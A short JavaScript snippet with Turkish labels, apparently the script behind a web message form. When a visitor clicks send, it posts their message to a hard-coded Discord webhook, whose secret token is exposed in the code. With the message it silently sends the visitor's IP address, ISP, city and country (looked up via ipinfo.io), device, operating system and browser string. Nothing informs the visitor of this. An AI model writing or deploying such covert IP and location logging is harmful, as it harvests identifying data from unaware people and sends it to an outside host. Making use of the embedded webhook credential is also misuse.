var sendit = document.querySelector("#sendit");
var input = document.querySelector(".textarea"); // Bu satırı input alanınızın id'sine göre düzenleyin.

$.getJSON('https://ipinfo.io', function(data){
    var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    var device = isMobile ? 'Telefon' : 'Bilgisayar';
    var browser = navigator.userAgent;
    var os = navigator.platform;

    sendit.addEventListener("click" , function(){
        sendMessage();
    });

    function sendMessage() {
        var request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1104117413529784362/xSw835qhOdtprlpI6FIf2_gpWTcRFASXvvk4XTyeAzRZgGQhQv9866dSqO1PZ1xKnJME");
        request.setRequestHeader('Content-type', 'application/json');
        
        var date = new Date();
        var timestamp = date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + " - " + date.getDate() + "." + (date.getMonth() + 1) + "." + date.getFullYear();
        
        var params = {
            content: (".................... **   **" + "\n> " + "\n> @here" + "\n> **Gönderilme Zamanı:   : **" + "`" + timestamp + "`" + "\n> **IP Adresiniz   : **" +  data.ip  + "\n> **İnternet Servis Sağlayıcınız   : **" + data.org + "\n> **Konumunuz   : **" + data.city + ", " + data.region + ", " + data.country + "\n> **Kullandığınız Sistem:   : **" + device + "\n> **İşletim Sisteminiz:   : **" + os + "\n> **Tarayıcınız:   : **" + browser  + "\n> " + "\n>  **İçerik:   : **" + "`" + input.value + "`"  + "\n> " +   "\n ...................." )
        }
        request.send(JSON.stringify(params));
    }
});
